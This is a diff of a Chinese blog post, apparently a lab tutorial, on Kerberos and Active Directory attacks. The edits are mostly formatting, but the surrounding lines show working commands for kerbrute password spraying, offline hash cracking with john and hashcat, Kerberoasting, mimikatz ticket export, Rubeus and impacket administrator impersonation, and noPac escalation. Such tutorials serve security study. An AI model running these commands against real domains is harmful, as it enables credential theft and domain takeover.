@@ -2,6 +2,7 @@
 title: "kerberos攻击专题"
 date: 2025-12-11T00:00:00+08:00
 draft: false
+
 ---
 
 #  kerberos攻击专题
@@ -10,7 +11,7 @@ draft: false
 
 总的来看kerberos可以归结于两个字：票据，前面提到了各阶段的安全问题：
 
-![image-20240621224304346](https://img2023.cnblogs.com/blog/3450279/202406/3450279-20240621224306896-1548204939.png)
+![image-20240621224304346](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240621224306896-1548204939.png)
 
 ### AS-REQ阶段
 
@@ -47,6 +48,7 @@ msf上也有`kerberos_enumusers`模块
 该攻击同样可以在域外进行，但并不支持kerberos
 
 可以使用kerbrute进行喷洒：
+
 ~~~cmd
 kerbrute_windows_amd64.exe passwordspray --dc 192.168.111.100 -d yuy0ung.com user.txt Admin123456
 ~~~
@@ -83,6 +85,7 @@ kerbrute_windows_amd64.exe bruteuser --dc 192.168.111.100 -d yuy0ung.com user.tx
   ~~~
 
 * 再使用john进行离线破解即可：
+
   ~~~cmd
   john --wordlist=/opt/pass.txt hash.txt
   ~~~
@@ -160,6 +163,7 @@ Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CS
 ~~~
 
 将得到的hash值丢去hashcat进行破解，有概率得到明文密码：
+
 ~~~cmd
 hashcat -m 13100 hash.txt pass.txt --force
 ~~~
@@ -270,6 +274,7 @@ Adfind.exe -b "DC=yuy0ung,DC=com" -f "(&(objectCategory=computer)(objectClass=co
 ~~~
 
 如果域管访问过服务直接就能拿到凭据：
+
 ~~~cmd
 mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
 ~~~
@@ -401,6 +406,7 @@ Get-DomainObejctAcl -Identity PC | ?{$_.SecurityIdentifier -match "S-1-5-21-7546
   ~~~
 
 * 利用rubeus申请票据：
+
   ~~~cmd
   # 通过Rubeus申请机器账户testv$的TGT
   Rubeus.exe asktgt /user:testv$ /password:!qaz@WSX /domain:hack.com /dc:DC.hack.com /nowrap /outfile:testv.kirbi
@@ -410,6 +416,7 @@ Get-DomainObejctAcl -Identity PC | ?{$_.SecurityIdentifier -match "S-1-5-21-7546
   ~~~
 
   当然也可以使用impacket：
+
   ~~~cmd
   # 使用getST.py申请票据
   python3 getST.py hack.com/testv$:\!qaz@WSX -spn cifs/PC.hack.com -impersonate administrator -dc-ip <ip>
@@ -454,9 +461,9 @@ Get-DomainObejctAcl -Identity PC | ?{$_.SecurityIdentifier -match "S-1-5-21-7546
 * 接下来就可以使用高权限票据执行高权限操作了
 
 上述过程可以直接使用工具nopac.exe一步到位：
+
 ~~~cmd
 noPac.exe -domain yuy0ung.com -user hack -pass Admin123456 /dc DC01.yuy0ung.com /mAccount machine /mpassword root /service cifs /ptt
 ~~~
 
 运行完成即可生成票据并导入内存
-
